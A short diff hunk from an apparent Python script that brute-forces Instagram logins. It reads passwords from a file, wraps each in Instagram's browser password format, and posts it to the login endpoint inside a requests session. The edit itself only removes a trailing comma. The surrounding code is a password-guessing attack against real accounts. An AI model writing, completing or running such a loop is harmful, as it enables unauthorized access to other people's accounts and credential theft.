@@ -48,7 +48,7 @@ with requests.Session() as session:
             for passw in password_file:
                 payload = {
                     'username': username,
-                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{passw.strip()}',
+                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{passw.strip()}'
                 }
 
                 login_response = session.post(login_url, data=payload, headers=headers)
